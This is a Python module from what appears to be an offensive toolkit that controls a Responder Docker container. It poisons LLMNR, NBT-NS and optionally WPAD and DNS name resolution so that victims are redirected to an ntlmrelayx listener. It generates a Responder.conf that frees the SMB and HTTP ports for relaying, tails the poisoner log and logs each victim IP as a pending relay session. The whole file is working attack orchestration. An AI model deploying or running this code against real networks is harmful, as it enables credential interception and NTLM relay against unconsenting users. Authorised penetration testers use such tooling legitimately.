"""Controller for Responder Docker container (LLMNR/NBT-NS/mDNS/WPAD poisoning)."""
from __future__ import annotations

import threading
import time
from pathlib import Path
from typing import Optional

import docker
from docker.models.containers import Container

from btc_module_relay_nxc_impckt_rspndr.config import AppConfig
from btc_module_relay_nxc_impckt_rspndr.logger import get_logger, jsonl_event
from btc_module_relay_nxc_impckt_rspndr.session import SessionRegistry, SessionStatus
from btc_module_relay_nxc_impckt_rspndr.utils.docker_helpers import (
    ensure_image,
    get_client,
    run_detached,
    stop_container,
)

logger = get_logger()

CONTAINER_NAME = "btc-relay-responder"


class ResponderController:
    """Manages Responder container for passive LLMNR/NBT-NS poisoning.

    Responder runs with SMB=Off and HTTP=Off to avoid port conflicts
    with ntlmrelayx. It only poisons name resolution, redirecting
    victims to the attacker IP where ntlmrelayx listener lives.
    """

    def __init__(self, cfg: AppConfig, registry: SessionRegistry) -> None:
        self.cfg = cfg
        self.registry = registry
        self.client = get_client()
        self._container: Optional[Container] = None
        self._stop_event = threading.Event()
        self._log_thread: Optional[threading.Thread] = None

    def start(self) -> None:
        if not self.cfg.responder.enabled:
            logger.info("Responder is disabled in config")
            return

        ensure_image(self.client, self.cfg.docker.responder_image)
        stop_container(self.client, CONTAINER_NAME)

        # Generate Responder.conf with SMB/HTTP disabled to avoid
        # port conflicts with ntlmrelayx listener
        self._generate_config()

        volumes = self._build_volumes()
        cmd = self._build_command()

        self._container = run_detached(
            self.client,
            image=self.cfg.docker.responder_image,
            command=cmd,
            name=CONTAINER_NAME,
            network_mode=self.cfg.docker.network_mode,
            volumes=volumes,
        )
        logger.info(f"Responder started: {self._container.short_id}")

        self._stop_event.clear()
        self._log_thread = threading.Thread(target=self._tail_logs, daemon=True)
        self._log_thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._log_thread:
            self._log_thread.join(timeout=5)
        stop_container(self.client, CONTAINER_NAME)
        self._container = None
        logger.info("Responder stopped")

    def is_running(self) -> bool:
        if not self._container:
            return False
        try:
            self._container.reload()
            return self._container.status == "running"
        except Exception:
            return False

    def _generate_config(self) -> None:
        """Generate Responder.conf disabling SMB/HTTP to let ntlmrelayx own those ports."""
        conf_dir = Path(self.cfg.docker.responder_config_dir)
        conf_dir.mkdir(parents=True, exist_ok=True)
        conf_path = conf_dir / "Responder.conf"

        config_body = f"""[Responder Core]
SQLLite = Responder.db
SessionLog = Responder-Session.log
PoisonersLog = Poisoners-Session.log
AnalyzeLog = Analyzer-Session.log
Decode_FullDomain = On
HTMLToServe = files/AccessDenied.html

[HTTPS Server]
HTTPS = Off

[HTTP Server]
HTTP = Off

[SMB Server]
SMB = Off

[RDP Server]
RDP = Off

[SQL Server]
SQL = Off

[FTP Server]
FTP = Off

[IMAP Server]
IMAP = Off

[POP3 Server]
POP3 = Off

[SMTP Server]
SMTP = Off

[DNS Server]
DNS = {'On' if self.cfg.responder.dns else 'Off'}

[LDAP Server]
LDAP = Off

[DCERPC Server]
DCERPC = Off

[WinRM Server]
WinRM = Off

[SNMP Server]
SNMP = Off

[MSSQL Server]
MSSQL = Off

[HTTP-Auth]
HTTP-Basic = Off

[WPAD]
WPAD = {'On' if self.cfg.responder.wpad else 'Off'}
"""
        conf_path.write_text(config_body, encoding="utf-8")
        logger.info(f"Generated Responder.conf at {conf_path}")

    def _build_volumes(self) -> dict:
        logs = str(Path(self.cfg.docker.logs_dir).resolve())
        resp_conf = str(Path(self.cfg.docker.responder_config_dir).resolve())
        Path(logs).mkdir(parents=True, exist_ok=True)
        Path(resp_conf).mkdir(parents=True, exist_ok=True)
        return {
            logs: {"bind": "/opt/responder/logs", "mode": "rw"},
            resp_conf: {"bind": "/opt/responder", "mode": "rw"},
        }

    def _build_command(self) -> list[str]:
        iface = self.cfg.responder.interface
        cmd = ["-I", iface, "-v"]
        if self.cfg.responder.wpad:
            cmd.append("-w")
        if self.cfg.responder.dns:
            cmd.append("-D")
        return cmd

    def _tail_logs(self) -> None:
        log_path = Path(self.cfg.docker.logs_dir) / "Poisoners-Session.log"
        for _ in range(30):
            if self._stop_event.is_set():
                return
            if log_path.exists():
                break
            time.sleep(0.5)

        if not log_path.exists():
            logger.warning("Responder Poisoners-Session.log never appeared")
            return

        with log_path.open("r", encoding="utf-8", errors="replace") as fh:
            while not self._stop_event.is_set():
                line = fh.readline()
                if not line:
                    time.sleep(0.5)
                    continue
                line = line.rstrip("\n")
                self._parse_line(line)

    def _parse_line(self, line: str) -> None:
        if "[*]" in line or "[+]" in line:
            logger.info(f"[Responder] {line}")
            jsonl_event("responder_log", line=line)
            if "poisoned" in line.lower():
                # Try to extract victim IP and requested name
                self._handle_poison_event(line)
        else:
            logger.debug(f"[Responder] {line}")

    def _handle_poison_event(self, line: str) -> None:
        """Create a session entry for a poisoned LLMNR/NBT-NS request."""
        import re
        ip_match = re.search(r"(\d{1,3}\.){3}\d{1,3}", line)
        source_ip = ip_match.group(0) if ip_match else ""
        sess = self.registry.create(
            source_ip=source_ip,
            status=SessionStatus.PENDING,
            coerce_method="responder_poison",
        )
        logger.info(f"[Responder] Poison event logged for {source_ip} session={sess.id}")
